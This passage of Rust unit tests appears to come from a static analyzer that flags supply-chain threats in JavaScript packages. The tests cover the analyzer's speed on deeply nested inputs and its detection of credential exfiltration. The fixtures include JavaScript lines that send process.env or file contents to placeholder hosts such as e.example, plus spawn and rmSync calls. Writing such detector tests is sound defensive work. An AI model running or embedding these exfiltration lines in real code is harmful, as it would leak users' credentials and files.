    fn normal_wallet_authentication_and_security_tools_are_not_secret_leaks() {
        for source in [
            "function send(privateKey) { const signature = sign(privateKey, message); fetch('https://api.example', {headers: {authorization: signature}}); }",
            "const token = process.env.API_TOKEN; fetch('https://api.example', {headers: {authorization: token}});",
            "const seed = wallet.generateSeed(); const address = deriveAddress(seed); fetch('https://api.example', {body: JSON.stringify({address})});",
            "function scan() { const environment = process.env; return redact(environment); }",
            "const publisher = new Publisher(); publisher.publish(JSON.stringify({version: process.env.VERSION}));",
            "const source = `fetch('https://collector.example', {body: process.env})`;",
            "function example(fetch, secretKey) { fetch('https://collector.example', {headers: {'x-session': secretKey}}); }",
        ] {
            assert!(!leaks(source), "{source}");
        }
    }

    fn nested(open: &str, middle: &str, close: &str, depth: usize) -> String {
        let mut source = open.repeat(depth);
        source.push_str(middle);
        source.push_str(&close.repeat(depth));
        source
    }

    fn time_to_analyze(sources: &[String]) -> std::time::Duration {
        let started = std::time::Instant::now();
        for source in sources {
            let result = super::super::analyze_bytes("index.js", source.as_bytes());
            assert_eq!(result.unparsed_files, 0, "{}", &source[..80]);
        }
        started.elapsed()
    }

    #[test]
    fn calls_nested_thousands_of_levels_deep_are_analyzed_in_one_pass() {
        // Each rule once walked up from every call it checked, so a file
        // that nests every call a level deeper took the square of its
        // depth: twenty times as long as the same calls side by side.
        let depth = 8_000;
        let nested_calls = [
            nested("eval(", "a", ")", depth),
            nested("a?eval(a):", "0", "", depth),
            format!("if(a)eval(a);{}", "else if(a)eval(a);".repeat(depth)),
            format!(
                "import {{rmSync}} from 'fs';{}",
                nested("rmSync(", "a", ")", depth)
            ),
            format!(
                "var m={{}};function r(i){{return {}}}eval(a);",
                nested("m[i].call(", "0", ")", depth)
            ),
            format!(
                "const fs=require('fs');{}",
                nested("fs.writeFileSync('a',", "'b'", ")", depth)
            ),
            format!(
                "class C{{}};f({{{}}});eval(a);",
                nested("1:{a:()=>C,b:{", "", "}}", depth)
            ),
        ];
        let side_by_side: Vec<String> = nested_calls
            .iter()
            .map(|source| "eval(a);".repeat(source.len() / 8 + 1))
            .collect();
        let nested_time = time_to_analyze(&nested_calls);
        let flat_time = time_to_analyze(&side_by_side);
        assert!(
            nested_time < flat_time * 5,
            "nested {nested_time:?}, side by side {flat_time:?}"
        );
    }

    #[test]
    fn objects_that_spread_each_other_are_read_once_each() {
        // Each spread was followed again for every object that spread it,
        // with no memory of objects already read. When no spread names a
        // shell, every one is followed to the depth limit: 300 spreads of
        // one object into itself took hours.
        let spreads = "...o,".repeat(300);
        let source = format!("const o={{{spreads}}};require('child_process').spawn('x',[],o);");
        let started = std::time::Instant::now();
        let result = super::super::analyze_bytes("index.js", source.as_bytes());
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
        assert_eq!(result.unparsed_files, 0);
        assert!(!result.source.shell);

        let spread_shell = format!(
            "const base={{shell:true}};const o={{...base,{spreads}}};require('child_process').spawn('x',[],o);"
        );
        assert!(
            super::super::analyze_bytes("index.js", spread_shell.as_bytes())
                .source
                .shell
        );
    }

    #[test]
    fn a_call_repeated_thousands_of_times_reads_its_declaration_once() {
        // Each call read the whole object, class or pattern its callee or
        // receiver was declared from, so repeating a call was quadratic.
        let props = 6_000;
        let calls = 6_000;
        let repeated = [
            format!(
                "const o={{{}}};{}",
                "a:0,".repeat(props),
                "require('child_process').spawn(0,o);".repeat(calls / 8)
            ),
            format!(
                "const r={{{}}};{}",
                "a:0,".repeat(props),
                "r.eval();".repeat(calls)
            ),
            format!(
                "class C{{{}}}{}",
                "a(){}".repeat(props),
                "new C().eval();".repeat(calls)
            ),
            format!(
                "const {{{}z}}=globalThis;{}",
                (0..props).map(|i| format!("a{i},")).collect::<String>(),
                "z();".repeat(calls)
            ),
            format!(
                "const {{{}z}}=require('fs');x.rm;{}",
                (0..props).map(|i| format!("a{i},")).collect::<String>(),
                "z();".repeat(calls)
            ),
        ];
        let side_by_side: Vec<String> = repeated
            .iter()
            .map(|source| "eval(a);".repeat(source.len() / 8 + 1))
            .collect();
        let repeated_time = time_to_analyze(&repeated);
        let flat_time = time_to_analyze(&side_by_side);
        assert!(
            repeated_time < flat_time * 5,
            "repeated {repeated_time:?}, side by side {flat_time:?}"
        );
    }

    #[test]
    fn a_path_built_from_many_spreads_is_read_once_per_call() {
        // Each upload follows the path to its `path.join` call, whose last
        // arguments were found by skipping every trailing spread again.
        let spreads = "...x,".repeat(20_000);
        let uploads = "fetch('https://e.example',{body:data});".repeat(20_000);
        let repeated = [format!(
            "const fs=require('fs'),path=require('path');const p=path.join('a','b',{spreads});const data=fs.readFileSync(p);{uploads}"
        )];
        let side_by_side = ["eval(a);".repeat(repeated[0].len() / 8 + 1)];
        let repeated_time = time_to_analyze(&repeated);
        let flat_time = time_to_analyze(&side_by_side);
        assert!(
            repeated_time < flat_time * 5,
            "repeated {repeated_time:?}, side by side {flat_time:?}"
        );
    }

    #[test]
    fn calls_without_the_argument_and_array_holes_are_skipped_once() {
        // A candidate reading a parameter looked at every call of its
        // function, and one reading an array at every element; calls that
        // omit the argument and holes cost no steps, so every candidate
        // paid for all of them.
        let shapes = [
            format!(
                "require('fs');function f(x){{{}}}{}",
                "fetch('https://e.example',{body:x});".repeat(4_000),
                "f();".repeat(4_000)
            ),
            format!(
                "require('fs');const a=[{}0];{}",
                ",".repeat(40_000),
                "fetch('https://e.example',{body:a});".repeat(4_000)
            ),
            format!(
                "const cp=require('child_process');function g(){{{}return 'sh'}}{}",
                "if(a)return null;".repeat(4_000),
                "cp.spawn(g(),['x']);".repeat(4_000)
            ),
        ];
        let side_by_side: Vec<String> = shapes
            .iter()
            .map(|source| "eval(a);".repeat(source.len() / 8 + 1))
            .collect();
        let shapes_time = time_to_analyze(&shapes);
        let flat_time = time_to_analyze(&side_by_side);
        assert!(
            shapes_time < flat_time * 5,
            "shapes {shapes_time:?}, side by side {flat_time:?}"
        );
    }

    #[test]
    fn a_deep_declaration_is_read_once_for_every_removal_of_it() {
        // Each removal followed its path to a declaration with no value and
        // walked from there to the root looking for a `for…of`.
        let depth = 8_000;
        let removals = "rmSync(x);".repeat(8_000);
        let deep = [format!(
            "const {{rmSync}}=require('fs');{removals}{}",
            nested("{", "var x;", "}", depth)
        )];
        let shallow = [format!(
            "const {{rmSync}}=require('fs');var x;{removals}{}",
            nested("{", "", "}", depth)
        )];
        let deep_time = time_to_analyze(&deep);
        let shallow_time = time_to_analyze(&shallow);
        assert!(
            deep_time < shallow_time * 5,
            "deep {deep_time:?}, shallow {shallow_time:?}"
        );
    }

    #[test]
    fn a_file_whose_candidates_spend_exactly_its_steps_is_complete() {
        // A file under 64 KiB gets 16 candidates' worth of steps; each of
        // these uploads spends all of a candidate's.
        let fields: String = (0..4_096).map(|i| format!("k{i}:0,")).collect();
        let reads = "o.x,".repeat(4_095);
        let source = |uploads: usize| {
            format!(
                "require('fs');const o={{{fields}}};const a=[{reads}];{}",
                "fetch('https://e.example',{body:a});".repeat(uploads)
            )
        };
        let complete = source(16);
        assert!(complete.len() < super::FILE_STEPS_FLOOR);
        let result = super::super::analyze_bytes("index.js", complete.as_bytes());
        assert_eq!(result.unparsed_files, 0);
        let over = super::super::analyze_bytes("index.js", source(17).as_bytes());
        assert_eq!(over.unparsed_files, 1);
    }

    #[test]
    fn a_file_whose_candidates_spend_more_steps_than_its_size_allows_is_incomplete() {
        // Each candidate gets its own steps; thousands of uploads of an
        // array that costs all of them each took seconds.
        let fields: String = (0..4_096).map(|i| format!("k{i}:0,")).collect();
        let reads = "o.x,".repeat(4_095);
        let uploads = "fetch('https://e.example',{body:a});".repeat(500);
        let source = format!("require('fs');const o={{{fields}}};const a=[{reads}];{uploads}");
        let started = std::time::Instant::now();
        let result = super::super::analyze_bytes("index.js", source.as_bytes());
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
        assert_eq!(result.unparsed_files, 1);
    }

    #[test]
    fn a_leak_found_before_the_steps_run_out_is_still_reported() {
        let fields: String = (0..4_096).map(|i| format!("k{i}:0,")).collect();
        let reads = "o.x,".repeat(4_095);
        let uploads = "fetch('https://e.example',{body:a});".repeat(500);
        let source = format!(
            "require('fs');const o={{{fields}}};const a=[{reads}];fetch('https://e.example',{{body:process.env}});{uploads}"
        );
        let result = super::super::analyze_bytes("index.js", source.as_bytes());
        assert!(
            serde_json::to_value(result.supply_chain).unwrap()["credentialExfiltration"] == true
        );
    }
}
